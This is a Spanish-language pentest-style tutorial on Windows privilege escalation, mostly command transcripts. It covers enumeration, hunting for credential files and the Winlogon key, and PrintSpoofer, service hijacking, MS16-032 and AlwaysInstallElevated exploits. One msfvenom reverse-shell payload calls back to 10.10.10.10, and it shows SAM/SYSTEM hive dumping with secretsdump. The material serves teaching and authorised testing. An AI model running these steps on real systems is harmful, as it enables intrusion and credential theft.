💡 ¿Por qué Windows es diferente?
En Windows no existe un único usuario "root". El equivalente es NT AUTHORITY\SYSTEM o pertenecer al grupo Administrators. Las técnicas de escalamiento aprovechan privilegios mal configurados, servicios vulnerables, y el modelo de tokens de Windows.
👤 Cuentas clave
  • •NT AUTHORITY\SYSTEM — El "root" de Windows
  • •Administrator — Cuenta con privilegios elevados
  • •NT SERVICE — Cuentas de servicio
🔑 Privilegios críticos
  • •SeImpersonatePrivilege — JuicyPotato/PrintSpoofer
  • •SeBackupPrivilege — Leer cualquier archivo
  • •SeDebugPrivilege — Acceso a procesos
  • •SeTakeOwnershipPrivilege — Tomar posesión
📋 Flujo de Trabajo en Windows
  • 1 Shell inicial (cmd.exe o powershell)
  • 2 Enumerar: usuario, grupos, privilegios, servicios
  • 3 Identificar vectores: kernel exploits, misconfiguraciones, tokens
  • 4 Explotar con herramientas nativas o binarios compilados
  • 5 Elevar a SYSTEM o Administrator
🔍 Enumeración en Windows
Windows requiere un enfoque diferente. PowerShell y comandos nativos son tu mejor aliado.
🖥️ Información del Sistema ▼
PS C:\> systeminfo PS C:\> wmic qfe get Caption,Description,HotFixID,InstalledOn PS C:\> [Environment]::OSVersion PS C:\> Get-ComputerInfo | Select OsName,OsVersion,WindowsVersion # Busca patches faltantes con windows-exploit-suggester
👤 Usuario, Grupos y Privilegios ▼
PS C:\> whoami /user PS C:\> whoami /groups PS C:\> whoami /priv Privilege Name Description State ============================= ============================== ======== SeImpersonatePrivilege Impersonate a client Enabled PS C:\> net user PS C:\> net localgroup administrators
SeImpersonatePrivilege habilitado = puedes usar JuicyPotato, PrintSpoofer o RoguePotato.
⚙️ Servicios y Procesos ▼
PS C:\> Get-Service | Where-Object {$_.Status -eq 'Running'} PS C:\> Get-Process PS C:\> tasklist /svc PS C:\> sc query PS C:\> wmic service get name,displayname,pathname,startmode # Busca servicios con rutas sin comillas o permisos débiles
🔐 Búsqueda de Archivos Sensibles ▼
PS C:\> Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.ini,*.config -Recurse -ErrorAction SilentlyContinue PS C:\> Get-ChildItem -Path C:\Users -Include *password*,*cred*,*secret* -Recurse -ErrorAction SilentlyContinue PS C:\> Get-ChildItem -Path C:\ -Include Unattend.xml -Recurse -ErrorAction SilentlyContinue PS C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
🎯 Técnicas de Escalamiento en Windows
Selecciona una técnica para ver el exploit paso a paso.
1️⃣ Token Impersonation (JuicyPotato / PrintSpoofer) Fácil ▼
Requiere SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege.
PS C:\> whoami /priv | findstr Impersonate SeImpersonatePrivilege Impersonate a client Enabled PS C:\> .\PrintSpoofer64.exe -i -c cmd NT AUTHORITY\SYSTEM
Alternativas: JuicyPotato.exe, RoguePotato.exe, GodPotato.
2️⃣ Unquoted Service Path Medio ▼
Si un servicio tiene una ruta sin comillas y espacios, Windows interpreta mal la ejecución.
PS C:\> wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\" | findstr /i /v '"' VulnService C:\Program Files\Vuln App\service.exe Auto PS C:\> icacls "C:\Program Files\Vuln App" BUILTIN\Users:(OI)(CI)(M) PS C:\> copy shell.exe "C:\Program Files\Vuln.exe" PS C:\> sc stop VulnService && sc start VulnService NT AUTHORITY\SYSTEM
3️⃣ Weak Service Permissions (DACL Abuse) Medio ▼
Si puedes modificar el binario de un servicio que corre como SYSTEM:
PS C:\> accesschk.exe -uwcqv "Authenticated Users" * RW VulnService SERVICE_ALL_ACCESS PS C:\> sc config VulnService binpath= "C:\Users\Public\shell.exe" PS C:\> sc stop VulnService && sc start VulnService
4️⃣ Kernel Exploits (WinPEAS / windows-exploit-suggester) Avanzado ▼
PS C:\> systeminfo > sysinfo.txt PS C:\> python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt [E] MS16-032 Secondary Logon Handle Privilege Escalation PS C:\> .\MS16-032.exe NT AUTHORITY\SYSTEM
Exploits comunes: MS16-032, MS15-051, CVE-2021-1732, CVE-2021-36934 (HiveNightmare).
5️⃣ AlwaysInstallElevated Fácil ▼
PS C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated PS C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated AlwaysInstallElevated REG_DWORD 0x1 PS C:\> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o shell.msi PS C:\> msiexec /quiet /qn /i C:\Users\Public\shell.msi
6️⃣ SeBackupPrivilege / SeRestorePrivilege Medio ▼
Con SeBackup puedes leer cualquier archivo. Úsalo para copiar SAM y SYSTEM:
PS C:\> whoami /priv | findstr Backup SeBackupPrivilege Back up files and directories Enabled PS C:\> .\SeBackupPrivilegeCmd.exe PS C:\> reg save hklm\sam C:\Users\Public\sam PS C:\> reg save hklm\system C:\Users\Public\system $ python3 secretsdump.py -sam sam -system system LOCAL
